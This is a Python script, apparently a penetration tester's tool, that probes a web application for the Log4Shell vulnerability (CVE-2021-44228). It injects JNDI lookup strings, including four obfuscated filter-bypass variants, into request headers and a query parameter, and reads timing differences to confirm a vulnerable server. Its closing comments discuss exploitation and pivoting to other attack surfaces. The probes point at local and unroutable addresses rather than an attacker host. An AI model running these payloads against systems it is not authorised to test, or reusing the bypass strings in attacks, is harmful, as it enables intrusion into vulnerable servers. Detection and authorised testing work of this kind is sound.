#!/usr/bin/env python3
# [REFERENCE] CVE-2021-44228 Log4Shell detection battery — OFFLINE-TARGET FRIENDLY.
# Fingerprint: any Java app that logs user input (headers, params, UA). Goal here is
# CONFIRMATION, not exfil: the target is usually network-isolated, so point JNDI at
# addresses whose failure mode is observable (127.0.0.1 high port = instant refusal
# vs a blackhole IP = hang) and diff response time/body.
# Usage: python3 log4shell-detect.py http://TARGET
import requests, sys, time, urllib3
urllib3.disable_warnings()

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://localhost"

FAST = "${jndi:ldap://127.0.0.1:9/a}"          # refuses instantly if resolved
SLOW = "${jndi:ldap://10.255.255.1:1389/a}"    # blackhole -> multi-second hang if resolved
BYPASS = ["${${::-j}ndi:ldap://127.0.0.1:9/a}", "${${lower:j}ndi:ldap://127.0.0.1:9/a}",
          "${j${::-n}di:ldap://127.0.0.1:9/a}", "${${env:FOO:-j}ndi:ldap://127.0.0.1:9/a}"]

def send(val, where):
    headers = {"User-Agent": val, "X-Api-Version": val, "Referer": val, "X-Custom": val}
    t0 = time.time()
    try:
        r = requests.get(BASE, params={"q": val}, headers=headers, verify=False, timeout=30)
        return time.time() - t0, r.status_code, len(r.content)
    except Exception as e:
        return time.time() - t0, "ERR", str(e)[:60]

base_t, base_c, _ = send("baseline-no-jndi", None)
print("baseline: %.2fs %s" % (base_t, base_c))

for name, val in (("fast-probe", FAST), ("slow-probe", SLOW), ("bypass-1", BYPASS[0]),
                  ("bypass-2", BYPASS[1]), ("bypass-3", BYPASS[2]), ("bypass-4", BYPASS[3])):
    t, c, extra = send(val, None)
    verdict = ""
    if name == "slow-probe" and t > base_t + 2:
        verdict = "HANG-DIFF => LOOKUP HAPPENED"
    print("%-10s %.2fs %s %s %s" % (name, t, c, extra if c == "ERR" else "", verdict))
# slow-probe hanging while baseline is fast = the JNDI lookup executed => vulnerable.
# fast-probe changing the response body (log4j error text) also confirms.
# Exploitation offline: use gadgets reachable without outbound (rare) or report the
# confirmed vuln and pivot to other surfaces — do NOT grind JNDI payloads offline.
